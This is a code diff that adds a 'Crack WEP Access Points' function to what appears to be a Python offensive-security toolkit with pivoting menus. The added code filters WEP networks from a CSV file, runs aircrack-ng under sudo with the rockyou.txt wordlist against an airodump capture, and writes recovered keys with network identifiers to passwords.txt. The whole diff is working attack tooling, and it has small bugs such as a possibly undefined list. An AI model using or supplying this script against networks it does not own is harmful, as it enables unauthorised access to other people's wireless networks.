@@ -147,7 +147,39 @@ def menu_option_2():
 
 def menu_option_3():
     print("Crack WEP Access Points")
-# More functions can be added here as needed.
+    file_path = "/mnt/data/access_points.txt"
+    try:
+        with open(file_path, mode='r') as file:
+            csv_reader = csv.reader(file)
+            wep_enabled_aps = []
+            for row in csv_reader:
+                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
+                    wep_enabled_aps.append(row)
+            if wep_enabled_aps:
+                print("WEP Enabled Access Points Found:")
+            else:
+                print("No access points found using WEP encryption.")
+    except FileNotFoundError:
+        print(f"The file {file_path} was not found.")
+    except Exception as e:
+        print(f"An error occurred while analyzing vulnerabilities: {e}")
+    #Attempt to crack the WEP key using aircrack-ng
+    for ap_row in wep_enabled_aps:
+        ap = ap_row[2]
+        print(f"Attempting to crack WEP key for {ap_row}...")
+        
+        try: #Replace the 2 directories with correct path to rockyou.txt or other wordlist, and the correct path to the packet capture file from airodump
+            result = subprocess.run(['sudo', 'aircrack-ng', '-b', ap, '-w', '/mnt/data/rockyou.txt', '/mnt/data/filename.cap'], capture_output = True, text = True)
+            if "KEY FOUND" in result.stdout: #Checks the output of the aircrack. If a key was found, store the results.
+                password = result.stdout.split("KEY FOUND! [ ")[1].split(" ]")[0]
+                ssid = ap 
+                # Store cracked passwords
+                with open('/mnt/data/passwords.txt', 'a') as f: #Stores any found passwords and associated SSIDs to passwords.txt
+                    f.write(f"{ssid},{password}\n")
+            else:
+                print("Key not found for", ap)
+        except Exception as e:
+            print("Error occurred:", e)
 
 # PIVOT MENU OPTIONS
 def submenu_option_1():
